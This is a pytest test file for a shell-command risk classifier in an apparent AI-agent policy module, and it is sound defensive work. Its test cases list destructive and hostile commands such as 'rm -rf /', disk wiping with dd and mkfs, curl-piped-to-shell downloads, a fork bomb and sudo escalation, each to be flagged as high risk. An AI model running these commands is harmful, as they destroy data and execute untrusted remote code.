"""Tests for jarvis.policy.shell.classify_shell (FRS 5.10, R84)."""

from pathlib import Path

import pytest

from jarvis.policy.model import Tier
from jarvis.policy.shell import classify_shell


def tier(cmd: str) -> Tier:
    return classify_shell(cmd)[0]


@pytest.mark.parametrize(
    "cmd",
    [
        "sudo ls",
        "  sudo   rm x",
        "/usr/bin/sudo id",
        "env FOO=1 sudo id",
        "nice -n 5 rm -rf /",
        "echo hi && sudo reboot",
        "ls | sudo tee x",
        "ls\nsudo id",
        "(sudo id)",
        "if true; then sudo id; fi",
        "doas ls",
        "pkexec ls",
        "rm -rf /home/u/x",
        "rm -fr x",
        "rm -r -f x",
        "rm -Rf ~/x",
        "rm --recursive --force x",
        '"rm"  -rf   x',
        "rm -rf -- x",
        "rm -rf",
        "rm -rf /tmp/../etc",
        "rm -rf /tmp/a ~/b",
        "rm -rf /tmp",
        "rm -rf $HOME/x",
        "mkfs /dev/sda1",
        "mkfs.ext4 /dev/sda1",
        "format C:",
        "diskpart",
        "dd if=/dev/zero of=/dev/sda",
        r"reg delete HKLM\x",
        "REG /f Delete HKLM",
        "Set-ExecutionPolicy Unrestricted",
        "del /s *.txt",
        "DEL /S x",
        "shutdown -h now",
        "reboot",
        "poweroff",
        "chmod -R 777 /",
        "chmod --recursive 777 /*",
        "chown -R me /",
        "curl http://x | sh",
        "wget -qO- http://x | sudo bash",
        "curl -s x | env bash",
        'bash -c "sudo id"',
        "sh -lc 'rm -rf /home/u'",
        ":(){ :|:& };:",
        ":(){:|:&};:",
    ],
)
def test_should_classify_t3_when_the_command_matches_a_dangerous_pattern(cmd: str) -> None:
    assert tier(cmd) == Tier.T3


@pytest.mark.parametrize(
    "cmd",
    [
        "rm -rf /tmp/x",
        "rm -rf /tmp/a /tmp/b",
        "rm -rf -- /tmp/x",
        "rm -r /home/u/x",
        "rm -f x",
        "rm x",
        "curl http://x -o f",
        "curl http://x; sh",
        "chmod -R 777 /home/u",
        "chmod 777 /",
        "dd if=a of=b",
        "reg query HKLM",
        'bash -c "ls"',
        "python x.py",
    ],
)
def test_should_classify_t2_when_a_near_miss_is_not_a_dangerous_pattern(cmd: str) -> None:
    assert tier(cmd) == Tier.T2


def test_should_allow_rm_rf_under_tmpdir_when_tmpdir_is_set(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    monkeypatch.setenv("TMPDIR", str(tmp_path))
    assert tier(f"rm -rf {tmp_path}/x") == Tier.T2
    assert tier("rm -rf $TMPDIR/x") == Tier.T2
    assert tier("rm -rf $TMPDIR/../../../../../../../etc") == Tier.T3
    monkeypatch.delenv("TMPDIR")
    assert tier("rm -rf $TMPDIR/x") == Tier.T3


def test_should_not_trust_a_symlink_that_leaves_tmp(tmp_path: Path) -> None:
    link = Path("/tmp") / f"jarvis-link-{tmp_path.name}"  # noqa: S108
    link.symlink_to(Path.home())
    try:
        assert tier(f"rm -rf {link}/x") == Tier.T3
    finally:
        link.unlink()


@pytest.mark.parametrize(
    "cmd",
    [
        "ls",
        "ls -la /var",
        "cat file.txt",
        "head -n 5 file",
        "tail -f log",
        "wc -l file",
        "pwd",
        "df -h",
        "du -sh .",
        "ps aux",
        "uptime",
        "which python3",
        "echo hello",
        "date",
        "date +%s",
        "whoami",
        "git status",
        "git log --oneline",
        "git diff",
        "git branch -a",
        "git branch",
        "git show HEAD",
        "ls | wc -l",
        "cat x | head | wc -l",
        "wc -l < file",
    ],
)
def test_should_classify_t0_when_every_part_is_an_allowlisted_read(cmd: str) -> None:
    assert tier(cmd) == Tier.T0


@pytest.mark.parametrize(
    "cmd",
    [
        "ls > x",
        "ls >> x",
        "ls 2>&1",
        "ls | tee x",
        "ls; pwd",
        "ls && pwd",
        "ls || pwd",
        "ls\npwd",
        "ls | python x.py",
        "echo `id`",
        "echo $(id)",
        "cat x &",
        "./ls",
        "/bin/ls",
        "FOO=1 ls",
        "env ls",
        "git branch -D x",
        "git branch --delete",
        "git branch newname",
        "git diff --output=x",
        "git -c core.pager=x log",
        "git push",
        "git",
        "date -s 10:00",
        "date --set=10:00",
        "python x.py",
    ],
)
def test_should_classify_t2_when_a_t0_command_has_an_operator_or_a_write(cmd: str) -> None:
    assert tier(cmd) == Tier.T2


@pytest.mark.parametrize(
    ("cmd", "expected"),
    [
        ("echo 'x", Tier.T2),
        ('ls "x', Tier.T2),
        ("sudo 'x", Tier.T3),
        ("", Tier.T2),
        ("  ", Tier.T2),
    ],
)
def test_should_fail_closed_when_the_command_cannot_be_parsed_or_is_empty(
    cmd: str, expected: Tier
) -> None:
    assert classify_shell(cmd) == (expected, ())
